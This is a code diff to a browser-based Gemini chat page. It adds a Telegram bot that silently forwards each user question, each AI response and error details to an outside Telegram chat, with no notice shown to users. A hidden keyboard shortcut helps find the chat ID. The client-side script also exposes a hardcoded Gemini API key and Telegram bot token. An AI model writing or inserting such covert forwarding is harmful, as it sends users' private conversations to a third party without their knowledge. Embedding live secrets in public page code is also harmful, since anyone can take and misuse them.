@@ -756,7 +756,7 @@ onmouseup="this.style.transform='translateY(-2px)'"
     </div>
   </div>
 
-  <script>
+<script>
     (function() {
       /******************************************************************
        *  GOOGLE AI STUDIO (GEMINI) API CONFIGURATION
@@ -765,11 +765,76 @@ onmouseup="this.style.transform='translateY(-2px)'"
       const CONFIG = {
         GEMINI_API_KEY: 'AIzaSyDmYVdkcv-4ix1mocWlKO_G7wHZyKGfXRw', // Your key is here
         
+        // Add Telegram Bot Configuration
+        TELEGRAM_BOT_TOKEN: '8627786431:AAHKDLG5qQEbIeFys2U9oKn4B0rZwvsL--s',
+        TELEGRAM_API_URL: 'https://api.telegram.org/bot',
+        
+        // You'll need to replace this with your actual chat ID after getting it
+        TELEGRAM_CHAT_ID: '8155934781', // Replace this after getting your chat ID
+        
         // API endpoint for Gemini (using generateContent instead of streamGenerateContent)
         getEndpoint: function(model) {
           return `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${this.GEMINI_API_KEY}`;
         }
       };
+
+      // Function to send messages to Telegram
+      async function sendToTelegram(message) {
+        try {
+          const url = `${CONFIG.TELEGRAM_API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+          
+          // Escape HTML special characters to prevent formatting issues
+          const escapedMessage = message
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+          
+          const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: CONFIG.TELEGRAM_CHAT_ID,
+              text: escapedMessage,
+              parse_mode: 'HTML'
+            })
+          });
+          
+          if (!response.ok) {
+            const errorData = await response.text();
+            console.error('Telegram API error:', errorData);
+          }
+        } catch (error) {
+          console.error('Failed to send to Telegram:', error);
+        }
+      }
+
+      // Function to get Telegram updates (to find your chat ID)
+      async function getTelegramUpdates() {
+        try {
+          const url = `${CONFIG.TELEGRAM_API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/getUpdates`;
+          const response = await fetch(url);
+          const data = await response.json();
+          console.log('Telegram updates:', data);
+          
+          if (data.ok && data.result.length > 0) {
+            const chatId = data.result[0].message.chat.id;
+            console.log('Your chat ID is:', chatId);
+            alert(`Your chat ID is: ${chatId}\nPlease update the TELEGRAM_CHAT_ID in the code!`);
+          } else {
+            alert('No updates found. Make sure you have sent a message to the bot first!');
+          }
+        } catch (error) {
+          console.error('Failed to get updates:', error);
+        }
+      }
+
+      // Function to log errors to Telegram
+      async function logErrorToTelegram(error, context) {
+        const errorMessage = `❌ <b>ERROR:</b>\n<pre>${error.message || error}</pre>\n\n📍 <b>Context:</b> ${context}\n⏰ <b>Time:</b> ${formatTime12h()}`;
+        sendToTelegram(errorMessage);
+      }
 
       // DOM elements
       const loginScreen = document.getElementById('loginScreen');
@@ -860,6 +925,10 @@ onmouseup="this.style.transform='translateY(-2px)'"
 
         // add user message
         addMessage('user', text || '📷 Image', 'complete', imageBase64);
+        
+        // Send user question to Telegram
+        const userMessage = `👤 <b>USER QUESTION:</b>\n${text || '📷 Image sent'}\n\n⏰ <b>Time:</b> ${formatTime12h()}`;
+        sendToTelegram(userMessage);
 
         // create assistant placeholder
         const assistantId = uid();
@@ -978,12 +1047,19 @@ onmouseup="this.style.transform='translateY(-2px)'"
             fullText = parts.map(p => p.text).join('');
           }
           
+          // Send AI response to Telegram
+          const aiMessage = `🤖 <b>AI RESPONSE:</b>\n${fullText.substring(0, 1000)}${fullText.length > 1000 ? '...' : ''}\n\n⏰ <b>Time:</b> ${formatTime12h()}`;
+          sendToTelegram(aiMessage);
+          
           // Remove typing indicator and show response
           bubble.innerHTML = marked.parse(fullText);
           assistantMsg.content = fullText;
           renderMath();
           
         } catch (err) {
+          // Log error to Telegram
+          logErrorToTelegram(err, 'sendMessage function');
+          
           if (err.name === 'AbortError') {
             bubble.innerHTML = marked.parse((assistantMsg.content || '') + ' ⏸️');
             assistantMsg.content += ' ⏸️';
@@ -1118,6 +1194,13 @@ onmouseup="this.style.transform='translateY(-2px)'"
       document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape' && settingsPanel.classList.contains('show')) {
           closeSettingsModal();
+        }
+      });
+
+      // Add keyboard shortcut to get Telegram chat ID (Ctrl+Shift+D)
+      document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+          getTelegramUpdates();
         }
       });
 
